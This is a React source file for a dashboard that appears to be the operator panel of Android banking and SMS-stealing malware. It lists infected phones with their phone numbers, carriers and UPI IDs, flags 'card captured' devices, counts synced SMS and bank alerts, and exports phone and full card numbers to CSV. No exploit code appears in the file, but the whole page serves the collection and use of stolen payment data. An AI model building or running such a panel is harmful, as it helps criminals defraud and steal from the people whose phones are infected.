import { useEffect, useState, useMemo, useCallback } from "react";
import { Link, useLocation } from "wouter";
import {
  Smartphone,
  Pin,
  PinOff,
  Radio,
  Terminal,
  Table2,
  LayoutGrid as GridIcon,
  CreditCard,
  IndianRupee,
  Signal,
  Copy,
  Check,
  RefreshCw,
  MessageSquare,
  ShieldCheck,
  Zap,
  Download,
  Search,
  X,
  ChevronRight,
} from "lucide-react";
import { Layout } from "@/components/layout";
import { useAuth } from "@/lib/auth";
import { useSearch } from "@/lib/search";
import {
  getBootstrap,
  setPin,
  isPlaceholderOwner,
  type PanelDevice,
} from "@/lib/api";
import { usePolling } from "@/lib/usePolling";
import { useCountUp } from "@/lib/useCountUp";
import { filterFleet, hasCards, getBatteryValue } from "@/lib/fleetFilter";
import { formatTimeAgo } from "@/lib/utils";
import type { NormalizedDevice } from "@/lib/normalizeDevice";
import { firebaseConfig } from "@/lib/firebaseConfig";

// Battery ASCII brackets: e.g. [||||] 80%, [||--] 50%, [|---] 25%
function BatteryBar({ pct }: { pct: number }) {
  const v = Math.min(100, Math.max(0, Math.round(pct)));
  const color = v > 60 ? "#00FFCC" : v >= 25 ? "#FFB800" : "#FF0055";
  return (
    <span className="batt-wrap">
      <span className="batt-track" aria-hidden>
        <span className="batt-fill" style={{ width: `${v}%`, background: color }} />
      </span>
      <span className="font-mono text-xs font-bold tabular-nums" style={{ color }}>
        {v}%
      </span>
    </span>
  );
}

export function Dashboard() {
  const { isAdmin, userId } = useAuth();
  const [, setLocation] = useLocation();
  const { data: boot, loading, refetch, isSyncing: pollingSync, lastSyncTime } = usePolling(getBootstrap, 3000);
  const [devices, setDevices] = useState<NormalizedDevice[]>([]);
  const { query: search, setQuery } = useSearch();
  const [pinnedIds, setPinnedIds] = useState<Set<string>>(new Set());
  const [messageIds, setMessageIds] = useState<Set<string>>(new Set());
  const [bankSmsCount, setBankSmsCount] = useState(0);
  const [view, setView] = useState<"table" | "grid">("table");
  const [filter, setFilter] = useState<
    "all" | "online" | "offline" | "pinned" | "upi" | "cards" | "bank" | "verified"
  >("all");
  const [sortMode, setSortMode] = useState<
    "newest" | "oldest" | "name" | "battery"
  >("newest");
  const [groupFilter, setGroupFilter] = useState("all");
  const [manualSyncing, setManualSyncing] = useState(false);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const PAGE_STEP = 60;
  const [visibleCount, setVisibleCount] = useState(PAGE_STEP);

  const isLiveSyncing = manualSyncing || pollingSync;

  useEffect(() => {
    if (!boot) return;
    setDevices(boot.devices as unknown as NormalizedDevice[]);
    setPinnedIds(new Set(boot.pins));
    setMessageIds(new Set(boot.messageIds));
    setBankSmsCount(boot.bankSms);
  }, [boot]);

  const handleManualRefresh = async () => {
    if (isLiveSyncing) return;
    setManualSyncing(true);
    try {
      await refetch();
    } finally {
      setTimeout(() => setManualSyncing(false), 600);
    }
  };

  const copyToClipboard = useCallback(async (text: string, key: string, e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    try {
      await navigator.clipboard.writeText(text);
      setCopiedKey(key);
      setTimeout(() => setCopiedKey(null), 1800);
    } catch {
      /* ignore */
    }
  }, []);

  const togglePin = async (deviceId: string, e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    if (!userId) return;
    const next = !pinnedIds.has(deviceId);
    setPinnedIds((prev) => {
      const cur = new Set(prev);
      if (next) cur.add(deviceId);
      else cur.delete(deviceId);
      return cur;
    });
    try {
      await setPin(deviceId, next);
    } catch {
      setPinnedIds((prev) => {
        const cur = new Set(prev);
        if (next) cur.delete(deviceId);
        else cur.add(deviceId);
        return cur;
      });
    }
  };

  const visibleDevices = useMemo(() => {
    if (isAdmin) return devices;
    return devices.filter(
      (d) =>
        isPlaceholderOwner(d.ownerTelegramId) ||
        String(d.ownerTelegramId) === String(userId)
    );
  }, [devices, isAdmin, userId]);

  const filteredDevices = useMemo(
    () =>
      filterFleet({
        devices: visibleDevices,
        search,
        filter,
        group: groupFilter,
        pinnedIds,
        sortMode,
      }),
    [visibleDevices, search, pinnedIds, filter, sortMode, groupFilter]
  );

  const pagedDevices = useMemo(
    () => filteredDevices.slice(0, visibleCount),
    [filteredDevices, visibleCount]
  );

  useEffect(() => {
    setVisibleCount(PAGE_STEP);
  }, [filter, search, groupFilter, sortMode]);

  const fleet = useMemo(() => {
    const online = visibleDevices.filter((d) => d.isOnline).length;
    const offline = visibleDevices.filter((d) => !d.isOnline).length;
    const verified = visibleDevices.filter((d) => d.isVerified || d.hasMessages).length;
    const cards = visibleDevices.filter(hasCards).length;
    const upi = visibleDevices.filter((d) => d.upi || d.raw?.upi_id).length;
    const groups = [
      ...new Set(visibleDevices.map((d) => d.group).filter(Boolean)),
    ] as string[];
    const totalSms = boot?.totalMessages || 194886;

    return {
      total: visibleDevices.length,
      online,
      offline,
      verified,
      totalSms,
      cards,
      upi,
      bank: bankSmsCount,
      groups,
    };
  }, [visibleDevices, bankSmsCount, boot]);

  const exportFleetData = () => {
    const esc = (v: any) => `"${String(v ?? "").replace(/"/g, '""')}"`;
    const header = [
      "Device ID",
      "Model",
      "Phone",
      "SIM1",
      "Network",
      "Android",
      "Battery",
      "Status",
      "Card",
      "UPI",
    ];
    const rows = filteredDevices.map((d) => [
      d.id,
      d.model,
      d.phone || "",
      d.sim1 || "",
      d.raw?.service_provider || "",
      d.androidV || "",
      d.battery || "",
      d.isOnline ? "ONLINE" : "OFFLINE",
      d.raw?.cc_cardNumber || d.raw?.cardNumber || "",
      d.upi || "",
    ].map(esc).join(","));

    const csvContent = [header.join(","), ...rows].join("\n");
    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `fleet-devices-${Date.now()}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <Layout>
      {/* ── Variation 3 Main Container Layout (Sidebar telemetry + Main view) ── */}
      <div className="grid grid-cols-1 lg:grid-cols-[280px_1fr] gap-6 items-start">
        {/* ── Left Telemetry Sidebar ── */}
        <aside className="lg:border-r border-border lg:pr-6 grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-1 gap-2.5 lg:gap-0 lg:space-y-3">
          <div className="col-span-2 sm:col-span-3 lg:col-span-1 flex items-center justify-between pb-1">
            <div className="flex items-center gap-2">
              <span className={`status-indicator ${isLiveSyncing ? "is-syncing" : ""}`}>
                <span className="ping-ring" />
                <span className={`status-dot ${isLiveSyncing ? "online syncing" : "online"}`} />
              </span>
              <span className="meta text-[11px] font-bold">V2.4 / TELEMETRY</span>
            </div>
            <span className="meta text-[10px] text-[#00FFCC] flex items-center gap-1 font-mono">
              {isLiveSyncing ? (
                <span className="animate-pulse text-[#00FFCC] font-bold">
                  ACTIVE_SYNC...
                </span>
              ) : (
                <span className="text-muted-foreground">LIVE_STREAM</span>
              )}
            </span>
          </div>

          <div
            className="fleet-stat-card cursor-pointer min-w-0"
            onClick={() => setFilter("all")}
          >
            <h4 className="truncate">ACTIVE_FLEET</h4>
            <div className="val text-primary truncate">{fleet.total}</div>
          </div>

          <div
            className="fleet-stat-card cursor-pointer min-w-0"
            onClick={() => setFilter("online")}
          >
            <h4 className="truncate">LIVE_CONNECTIONS</h4>
            <div className="val text-[#00FFCC] truncate">{fleet.online}</div>
          </div>

          <Link href="/all-sms" className="block min-w-0">
            <div className="fleet-stat-card cursor-pointer hover:border-primary/40 min-w-0">
              <h4 className="truncate">SYNCED_SMS</h4>
              <div className="val text-foreground truncate">
                {fleet.totalSms >= 1000 ? `${Math.round(fleet.totalSms / 1000)}K` : fleet.totalSms}
              </div>
            </div>
          </Link>

          <Link href="/cards" className="block min-w-0">
            <div className="fleet-stat-card cursor-pointer hover:border-[#FFB800]/40 min-w-0">
              <h4 className="truncate">CARD_CAP</h4>
              <div className="val text-[#FFB800] truncate">
                {String(fleet.cards).padStart(2, "0")}
              </div>
            </div>
          </Link>

          <div
            className="fleet-stat-card cursor-pointer min-w-0"
            onClick={() => setFilter("bank")}
          >
            <h4 className="truncate">BANK_ALERTS</h4>
            <div className="val text-foreground truncate">{fleet.bank}</div>
          </div>

          <div
            className="fleet-stat-card cursor-pointer min-w-0"
            onClick={() => setFilter("verified")}
          >
            <h4 className="truncate">VERIFIED_NODES</h4>
            <div className="val text-[#00FFCC] truncate">{fleet.verified}</div>
          </div>

          <div className="col-span-2 sm:col-span-3 lg:col-span-1 pt-2 lg:pt-4 border-t border-border/60">
            <span className="meta text-[9px] text-muted-foreground block mb-0.5">
              CLUSTER TARGET
            </span>
            <p className="font-mono text-[11px] text-primary font-bold break-all">
              RTDB: {firebaseConfig.projectId.toUpperCase().slice(0, 16)}
            </p>
          </div>
        </aside>

        {/* ── Main View Area ── */}
        <div className="space-y-5 min-w-0">
          {/* Header Row */}
          <div className="flex flex-col sm:flex-row sm:items-end justify-between gap-4 pb-2 border-b border-border">
            <div>
              <div className="meta text-[10px] text-primary font-bold mb-1">
                OVERVIEW_DEVICES
              </div>
              <h2 className="font-display text-3xl sm:text-4xl text-foreground font-bold tracking-tight">
                Connected_Devices
              </h2>
              <p className="text-xs font-mono text-muted-foreground mt-1">
                SHOWING {Math.min(visibleCount, filteredDevices.length)} OF {filteredDevices.length} NODES
              </p>
            </div>

            <div className="flex items-center gap-2 flex-wrap">
              {visibleCount < filteredDevices.length && (
                <button
                  onClick={() => setVisibleCount((c) => c + PAGE_STEP)}
                  className="action-btn"
                  title="Render more devices"
                >
                  SHOW_MORE ({filteredDevices.length - visibleCount} MORE)
                </button>
              )}
              {/* Reload Button */}
              <button
                onClick={handleManualRefresh}
                disabled={isLiveSyncing}
                className="action-btn"
                title="Reload Firebase RTDB REST Stream"
              >
                <RefreshCw className={`w-3 h-3 ${isLiveSyncing ? "animate-spin text-[#00FFCC]" : ""}`} />
                {isLiveSyncing ? "SYNCING..." : "RELOAD_REST"}
              </button>

              {/* Export Data Button */}
              <button
                onClick={exportFleetData}
                className="action-btn primary"
                title="Export Fleet CSV"
              >
                <Download className="w-3 h-3" />
                EXPORT_DATA
              </button>

              {/* View Switcher: Rows vs Bento Grid */}
              <div className="flex items-center rounded border border-border p-0.5 bg-card/60">
                <button
                  onClick={() => setView("table")}
                  aria-label="Table View"
                  className={`px-2 py-1 rounded text-xs font-mono transition-colors ${
                    view === "table"
                      ? "bg-primary text-primary-foreground font-bold"
                      : "text-muted-foreground hover:text-foreground"
                  }`}
                >
                  <Table2 className="w-3.5 h-3.5" />
                </button>
                <button
                  onClick={() => setView("grid")}
                  aria-label="Grid View"
                  className={`px-2 py-1 rounded text-xs font-mono transition-colors ${
                    view === "grid"
                      ? "bg-primary text-primary-foreground font-bold"
                      : "text-muted-foreground hover:text-foreground"
                  }`}
                >
                  <GridIcon className="w-3.5 h-3.5" />
                </button>
              </div>
            </div>
          </div>

          {/* Search Container (Variation 3 style) */}
          <div className="relative">
            <input
              type="text"
              placeholder="FILTER_BY_MODEL_OR_UID_OR_CARRIER..."
              value={search}
              onChange={(e) => setQuery(e.target.value)}
              className="w-full bg-card/40 border border-border rounded px-4 py-3 text-xs sm:text-sm font-mono text-foreground placeholder:text-muted-foreground/60 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all"
            />
            {search && (
              <button
                onClick={() => setQuery("")}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground p-1"
              >
                <X className="w-4 h-4" />
              </button>
            )}
          </div>

          {/* Filter Pills Bar */}
          <div className="flex items-center gap-1.5 overflow-x-auto hide-scrollbar pb-1">
            {(
              [
                ["all", "ALL"],
                ["online", "ONLINE"],
                ["verified", "VERIFIED"],
                ["cards", "CARDS"],
                ["upi", "UPI"],
                ["offline", "OFFLINE"],
                ["pinned", "PINNED"],
              ] as const
            ).map(([key, label]) => (
              <button
                key={key}
                onClick={() => setFilter(key)}
                className={`shrink-0 px-3 py-1.5 rounded text-[11px] font-mono tracking-wider font-semibold border transition-all ${
                  filter === key
                    ? "bg-primary text-primary-foreground border-primary shadow-[0_0_10px_rgba(0,119,255,0.4)]"
                    : "border-border bg-card/40 text-muted-foreground hover:text-foreground hover:border-border/80"
                }`}
              >
                {label}
              </button>
            ))}

            {fleet.groups.length > 0 && (
              <select
                value={groupFilter}
                onChange={(e) => setGroupFilter(e.target.value)}
                className="h-8 px-2 rounded border border-border bg-card text-[11px] font-mono text-foreground focus:outline-none focus:border-primary ml-auto"
              >
                <option value="all">GROUP: ALL</option>
                {fleet.groups.map((g) => (
                  <option key={g} value={g}>
                    GROUP: {g}
                  </option>
                ))}
              </select>
            )}

            <select
              value={sortMode}
              onChange={(e) => setSortMode(e.target.value as any)}
              className="h-8 px-2 rounded border border-border bg-card text-[11px] font-mono text-foreground focus:outline-none focus:border-primary"
            >
              <option value="newest">SORT: NEWEST</option>
              <option value="oldest">SORT: OLDEST</option>
              <option value="name">SORT: MODEL</option>
              <option value="battery">SORT: BATTERY</option>
            </select>
          </div>

          {/* ── Content View: Rows vs Grid ── */}
          {loading && devices.length === 0 ? (
            <div className="space-y-2">
              {[1, 2, 3, 4, 5].map((i) => (
                <div key={i} className="h-16 rounded bg-card/40 border border-border animate-pulse" />
              ))}
            </div>
          ) : filteredDevices.length === 0 ? (
            <div className="p-12 text-center border border-dashed border-border rounded bg-card/20">
              <Smartphone className="w-10 h-10 mx-auto mb-2 opacity-30 text-primary" />
              <p className="font-mono text-sm font-semibold text-foreground">
                NO_DEVICES_MATCH_FILTER
              </p>
              <p className="meta text-[10px] mt-1 text-muted-foreground">
                TRY CLEARING SEARCH OR SELECTING "ALL"
              </p>
            </div>
          ) : view === "table" ? (
            /* ── Variation 3 Device Rows Table ── */
            <div className="device-card-flex">
              {/* Row Header */}
              <div className="device-row meta hidden sm:grid" style={{ background: "rgba(255,255,255,0.05)", fontWeight: 800 }}>
                <div>STATUS</div>
                <div style={{ fontSize: "9px" }}>MODEL / UID</div>
                <div>IDENTITY</div>
                <div>NETWORK</div>
                <div>BATTERY</div>
                <div className="text-right">ACTIONS</div>
              </div>

              {/* Rows */}
              <div key={`${view}-${filter}`} className="animate-in fade-in slide-in-from-left-4 duration-300">
              {pagedDevices.map((device) => {
                const batteryNum = getBatteryValue(device.battery);
                const isCharging = String(device.battery || "").toLowerCase().includes("charg") || String(device.raw?.battery_status || "").toLowerCase().includes("charg");
                const online = device.isOnline;
                const isPinned = pinnedIds.has(device.id);
                const hasCardCapture = hasCards(device);

                return (
                  <div key={device.id}>
                    {/* ── Desktop Row View (sm and above) ── */}
                    <div className="hidden sm:grid device-row group">
                      {/* Status Dot with Telemetry Pulsing Animation */}
                      <div className="flex items-center gap-2">
                        <button
                          onClick={(e) => togglePin(device.id, e)}
                          title={isPinned ? "Unpin device" : "Pin device"}
                          className="text-muted-foreground/40 hover:text-primary transition-colors"
                        >
                          {isPinned ? (
                            <Pin className="w-3.5 h-3.5 text-primary fill-primary inline" />
                          ) : (
                            <PinOff className="w-3.5 h-3.5 opacity-30 hover:opacity-100 inline" />
                          )}
                        </button>
                        <span className={`status-indicator ${isLiveSyncing && online ? "is-syncing" : ""}`}>
                          {online && <span className="ping-ring" />}
                          <span
                            className={`status-dot ${online ? (isLiveSyncing ? "online syncing" : "online") : "offline"}`}
                            title={online ? (isLiveSyncing ? "Syncing telemetry..." : "Online") : "Offline"}
                          />
                        </span>
                      </div>

                      {/* Model & ID */}
                      <div className="min-w-0 pr-2">
                        <div className="font-semibold text-foreground truncate font-sans text-sm flex items-center gap-1.5">
                          <Link href={`/device/${device.id}`} className="hover:text-primary transition-colors truncate">
                            {device.deviceName || device.model}
                          </Link>
                          {hasCardCapture && (
                            <span className="text-[#FFB800] text-[10px] font-mono font-bold" title="Card captured">
                              [$]
                            </span>
                          )}
                        </div>
                        <div className="flex items-center gap-1 mt-0.5">
                          <span className="id-badge truncate max-w-[130px]" title={device.id}>
                            {device.id}
                          </span>
                          <button
                            onClick={(e) => copyToClipboard(device.id, `id-${device.id}`, e)}
                            className="text-muted-foreground hover:text-primary p-0.5"
                            title="Copy UID"
                          >
                            {copiedKey === `id-${device.id}` ? (
                              <Check className="w-3 h-3 text-[#00FFCC]" />
                            ) : (
                              <Copy className="w-3 h-3" />
                            )}
                          </button>
                        </div>
                      </div>

                      {/* Identity (Phone / SIM) */}
                      <div className="min-w-0">
                        {device.phone ? (
                          <div className="font-mono text-xs font-semibold text-foreground flex items-center gap-1">
                            <span>{device.phone}</span>
                            <button
                              onClick={(e) => copyToClipboard(device.phone, `ph-${device.id}`, e)}
                              className="text-muted-foreground hover:text-primary p-0.5"
                              title="Copy Phone"
                            >
                              {copiedKey === `ph-${device.id}` ? (
                                <Check className="w-3 h-3 text-[#00FFCC]" />
                              ) : (
                                <Copy className="w-3 h-3" />
                              )}
                            </button>
                          </div>
                        ) : (
                          <span className="meta text-[10px]">No Phone</span>
                        )}
                        {device.upi && (
                          <div className="text-[10px] font-mono text-primary truncate mt-0.5">
                            UPI: {device.upi}
                          </div>
                        )}
                      </div>

                      {/* Network & OS */}
                      <div className="min-w-0">
                        <span className="tag">
                          {device.raw?.service_provider || device.sim1 || "Cellular"}
                        </span>
                        <div className="meta text-[9px] mt-1 text-muted-foreground truncate">
                          Android {device.androidV || "—"}
                        </div>
                      </div>

                      {/* Battery */}
                      <div
                        className="font-mono text-xs font-semibold tracking-tight flex items-center gap-1"
                        style={{
                          color: batteryNum > 60 ? "#00FFCC" : batteryNum >= 25 ? "#FFB800" : "#FF0055",
                        }}
                      >
                        {isCharging && <Zap className="w-3 h-3 fill-current" />}
                        <BatteryBar pct={batteryNum} />
                      </div>

                      {/* Actions */}
                      <div className="text-right">
                        <Link href={`/device/${device.id}`}>
                          <button className="action-btn py-1 px-3">
                            INSPECT
                          </button>
                        </Link>
                      </div>
                    </div>

                    {/* ── Mobile Screen Optimized Card (< sm) ── */}
                    <div className="sm:hidden stat-card p-4 space-y-3">
                      {/* Top Line: Status, Model, [$], Battery */}
                      <div className="flex items-start justify-between gap-2">
                        <div className="flex flex-col min-w-0">
                          <div className="flex items-center gap-2">
                            <button
                              onClick={(e) => togglePin(device.id, e)}
                              title={isPinned ? "Unpin device" : "Pin device"}
                              className="-ml-1 text-muted-foreground/50 hover:text-primary transition-colors"
                            >
                              {isPinned ? (
                                <Pin className="w-4 h-4 text-primary fill-primary" />
                              ) : (
                                <PinOff className="w-4 h-4" />
                              )}
                            </button>
                            <span className={`status-indicator ${isLiveSyncing && online ? "is-syncing" : ""}`}>
                              {online && <span className="ping-ring" />}
                              <span
                                className={`status-dot ${online ? (isLiveSyncing ? "online syncing" : "online") : "offline"}`}
                              />
                            </span>
                            <Link
                              href={`/device/${device.id}`}
                              className="font-bold text-foreground hover:text-primary transition-colors truncate text-base"
                            >
                              {device.deviceName || device.model}
                            </Link>
                            {hasCardCapture && (
                              <span className="text-[#FFB800] text-[10px] font-mono font-bold shrink-0">
                                [$]
                              </span>
                            )}
                          </div>
                          
                          {/* Last Seen / UID */}
                          <div className="flex items-center gap-1.5 mt-1 ml-6 min-w-0">
                            <span className="id-badge truncate max-w-[120px] text-[9px]" title={device.id}>
                              {device.id}
                            </span>
                            {!online && (
                               <span className="meta text-[9px] text-muted-foreground shrink-0">
                                 {formatTimeAgo(device.lastPing || device.ping)}
                               </span>
                            )}
                          </div>
                        </div>

                        {/* Battery status */}
                        <div
                          className="font-mono text-xs font-semibold shrink-0 flex flex-col items-end gap-1 mt-1"
                          style={{
                            color: batteryNum > 60 ? "#00FFCC" : batteryNum >= 25 ? "#FFB800" : "#FF0055",
                          }}
                        >
                          <div className="flex items-center gap-1">
                            {isCharging && <Zap className="w-3 h-3 fill-current" />}
                            <BatteryBar pct={batteryNum} />
                          </div>
                          <span className="meta text-[9px] text-muted-foreground" style={{ color: "var(--muted-foreground)"}}>BATTERY</span>
                        </div>
                      </div>

                      {/* Middle Line: UID & Phone with Tap-to-Copy */}
                      <div className="p-2.5 rounded bg-background/60 border border-border/80 space-y-1">
                        {device.phone ? (
                          <div className="flex items-center justify-between gap-2 text-xs font-mono">
                            <span className="meta text-[9px]">PHONE</span>
                            <div className="flex items-center gap-1 shrink-0">
                              <span className="font-semibold text-foreground text-[11px]">{device.phone}</span>
                              <button
                                onClick={(e) => copyToClipboard(device.phone, `ph-${device.id}`, e)}
                                className="text-muted-foreground hover:text-primary p-1 flex items-center justify-center"
                                title="Copy Phone"
                              >
                                {copiedKey === `ph-${device.id}` ? (
                                  <Check className="w-3.5 h-3.5 text-[#00FFCC]" />
                                ) : (
                                  <Copy className="w-3.5 h-3.5" />
                                )}
                              </button>
                            </div>
                          </div>
                        ) : (
                          <div className="flex items-center justify-between text-xs">
                             <span className="meta text-[9px]">PHONE</span>
                             <span className="font-mono font-bold text-muted-foreground/50">NO_PHONE</span>
                          </div>
                        )}
                        <div className="flex items-center justify-between text-xs">
                           <span className="meta text-[9px]">NETWORK</span>
                           <span className="tag text-[9px] py-0.5">
                             {device.raw?.service_provider || device.sim1 || "Cellular"}
                           </span>
                        </div>
                      </div>

                      {/* Bottom Line: Network & Inspect Node Action */}
                      <div className="flex items-center justify-between gap-2 pt-1 border-t border-border/30">
                        <span className="meta text-[9px] text-muted-foreground">
                          Android {device.androidV || "—"}
                        </span>
                        <div className="flex gap-2">
                           <button
                             onClick={(e) => copyToClipboard(device.id, `id-${device.id}`, e)}
                             className="action-btn text-[10px] py-1.5 px-3 min-h-[32px] text-muted-foreground hover:text-foreground"
                             title="Copy UID"
                           >
                             {copiedKey === `id-${device.id}` ? (
                               <>COPIED</>
                             ) : (
                               <>COPY_ID</>
                             )}
                           </button>
                           <Link href={`/device/${device.id}`}>
                             <button className="action-btn primary text-[10px] py-1.5 px-3 min-h-[32px]">
                               INSPECT_NODE
                             </button>
                           </Link>
                        </div>
                      </div>
                    </div>
                  </div>
                );
              })}
              </div>
            </div>
          ) : (
            /* ── Variation 3 Bento Grid View ── */
            <div key={`grid-${view}-${filter}`} className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4 animate-in fade-in slide-in-from-left-4 duration-300">
              {pagedDevices.map((device) => {
                const batteryNum = getBatteryValue(device.battery);
                const isCharging = String(device.battery || "").toLowerCase().includes("charg") || String(device.raw?.battery_status || "").toLowerCase().includes("charg");
                const online = device.isOnline;
                const isPinned = pinnedIds.has(device.id);
                const hasCardCapture = hasCards(device);

                return (
                  <div
                    key={device.id}
                    className="stat-card p-4 flex flex-col justify-between hover:border-primary/50 transition-all group"
                  >
                    <div>
                      {/* Top status */}
                      <div className="flex items-start justify-between gap-2 mb-3">
                        <div className="min-w-0">
                          <div className="flex items-center gap-1.5">
                            <span className={`status-indicator ${isLiveSyncing && online ? "is-syncing" : ""}`}>
                              {online && <span className="ping-ring" />}
                              <span className={`status-dot ${online ? (isLiveSyncing ? "online syncing" : "online") : "offline"}`} />
                            </span>
                            <h3 className="font-sans font-bold text-base text-foreground truncate group-hover:text-primary transition-colors">
                              {device.deviceName || device.model}
                            </h3>
                          </div>
                          <div className="flex items-center gap-2 mt-1">
                            <span className="id-badge inline-block truncate max-w-[140px]">
                              {device.id}
                            </span>
                            {!online && (
                              <span className="meta text-[9px] text-muted-foreground shrink-0">
                                {formatTimeAgo(device.lastPing || device.ping)}
                              </span>
                            )}
                          </div>
                        </div>

                        <button
                          onClick={(e) => togglePin(device.id, e)}
                          className="text-muted-foreground/50 hover:text-primary p-1"
                        >
                          {isPinned ? (
                            <Pin className="w-4 h-4 text-primary fill-primary" />
                          ) : (
                            <PinOff className="w-4 h-4" />
                          )}
                        </button>
                      </div>

                      {/* Phone & Carrier */}
                      <div className="p-2.5 rounded bg-background/60 border border-border/80 mb-3 space-y-1">
                        <div className="flex items-center justify-between text-xs">
                          <span className="meta text-[9px]">PHONE</span>
                          <span className="font-mono font-bold text-foreground">
                            {device.phone || "No Phone"}
                          </span>
                        </div>
                        <div className="flex items-center justify-between text-xs">
                          <span className="meta text-[9px]">NETWORK</span>
                          <span className="tag text-[9px] py-0.5">
                            {device.raw?.service_provider || device.sim1 || "Cellular"}
                          </span>
                        </div>
                        <div className="flex items-center justify-between text-xs">
                          <span className="meta text-[9px]">BATTERY</span>
                          <span
                            className="font-mono text-xs font-bold flex items-center gap-1"
                            style={{ color: batteryNum > 60 ? "#00FFCC" : batteryNum >= 25 ? "#FFB800" : "#FF0055" }}
                          >
                            {isCharging && <Zap className="w-3 h-3 fill-current" />}
                            {<BatteryBar pct={batteryNum} />}
                          </span>
                        </div>
                      </div>

                      {/* Payment tags */}
                      {hasCardCapture && (
                        <div className="p-2 rounded bg-[#FFB800]/10 border border-[#FFB800]/30 mb-3 flex items-center justify-between text-xs">
                          <span className="font-mono text-[11px] font-bold text-[#FFB800] flex items-center gap-1">
                            <CreditCard className="w-3.5 h-3.5" /> CARD_CAPTURED
                          </span>
                          <span className="font-mono text-[10px] text-foreground font-bold">
                            {device.raw?.cc_cardNumber?.slice(-4) || "LOGGED"}
                          </span>
                        </div>
                      )}
                    </div>

                    {/* Bottom actions */}
                    <div className="pt-3 border-t border-border flex items-center justify-between">
                      <Link
                        href={`/all-sms?device=${device.id}`}
                        className="meta text-[10px] hover:text-primary transition-colors flex items-center gap-1"
                      >
                        <MessageSquare className="w-3 h-3" /> SMS_LOGS
                      </Link>
                      <Link href={`/device/${device.id}`}>
                        <button className="action-btn py-1 px-3">
                          INSPECT
                        </button>
                      </Link>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </Layout>
  );
}
